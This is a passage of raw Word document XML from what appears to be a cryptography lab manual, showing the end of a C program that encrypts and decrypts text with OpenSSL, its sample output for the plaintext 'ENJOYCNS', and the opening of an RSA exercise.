          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>)); pr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>f(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>\</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>ncry</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ed</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-4"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-17"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:t>ex</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>\t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>\</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t\</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>%s",encryp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ed</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">; </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>cpy(decry</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ed,Decry</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>(ke</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-16"/>
        </w:rPr>
        <w:t>y</w:t>
      </w:r>
      <w:r>
        <w:t>,encry</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ed,s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>z</w:t>
      </w:r>
      <w:r>
        <w:t>eof(p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ex</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>)),</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>zeof(p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>x</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>)); pr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>f(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>\</w:t>
      </w:r>
      <w:r>
        <w:t>nDecryp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ed</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-4"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-19"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>x</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t\</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>\t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>\</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>%</w:t>
      </w:r>
      <w:r>
        <w:t>s",decry</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ed);</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="810"/>
      </w:pPr>
      <w:r>
        <w:t>pr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>f(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>\</w:t>
      </w:r>
      <w:r>
        <w:t>nDecryp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ed</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-4"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-19"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>x</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>Hex Code</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> \</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>%</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">X </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>\</w:t>
      </w:r>
      <w:r>
        <w:t>n",</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>d</w:t>
      </w:r>
      <w:r>
        <w:t>ecryp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ed</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="810"/>
      </w:pPr>
      <w:r>
        <w:t>re</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>urn</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>(0);</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b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>O</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ut</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ut:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:hyperlink r:id="rId21">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rPr>
        <w:t>d</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-3"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>sopen.c -</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ssl</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>crypto</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:hyperlink r:id="rId22">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a.out</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100" w:right="4040"/>
      </w:pPr>
      <w:r>
        <w:t>P</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ext                                           </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="54"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>EN</w:t>
      </w:r>
      <w:r>
        <w:t>JOY</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>C</w:t>
      </w:r>
      <w:r>
        <w:t>NS P</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ext</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">Hex Code                      </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="40"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>B</w:t>
      </w:r>
      <w:r>
        <w:t>FD28266</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="3" w:line="260" w:lineRule="exact"/>
        <w:ind w:left="100" w:right="3407"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Key </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">n Hex Code                              </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="14"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>B</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">FD2826F </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>ncryp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ed</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-19"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>x</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">t                                 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="42"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Tahoma" w:eastAsia="DejaVu Serif" w:hAnsi="Tahoma" w:cs="Tahoma"/>
        </w:rPr>
        <w:t>���</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Tahoma" w:eastAsia="DejaVu Serif" w:hAnsi="Tahoma" w:cs="Tahoma"/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>�</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>{</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>S</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Tahoma" w:eastAsia="DejaVu Serif" w:hAnsi="Tahoma" w:cs="Tahoma"/>
        </w:rPr>
        <w:t>�</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Tahoma" w:eastAsia="DejaVu Serif" w:hAnsi="Tahoma" w:cs="Tahoma"/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>�</w:t>
      </w:r>
      <w:r>
        <w:t>S Decryp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ed</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-4"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-17"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ext                                 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="30"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>EN</w:t>
      </w:r>
      <w:r>
        <w:t>JOY</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>C</w:t>
      </w:r>
      <w:r>
        <w:t>NS Decryp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ed</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-4"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-17"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:t>ext</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">n Hex Code            </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>84</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>8</w:t>
      </w:r>
      <w:r>
        <w:t>D030</w:t>
      </w:r>
      <w:hyperlink r:id="rId23">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before="13" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>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630" w:right="715" w:hanging="4530"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Ex. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>N</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">o.: 7                                                                                                             </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="54"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>D</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ate: R</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>S</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>A</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RSA</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-13"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>asy</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>mm</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>key cryp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>osys</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>em</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>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Se</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>ect</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">wo </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-6"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:t>ge</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>pr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>im</w:t>
      </w:r>
      <w:r>
        <w:t>e nu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>b</w:t>
      </w:r>
      <w:r>
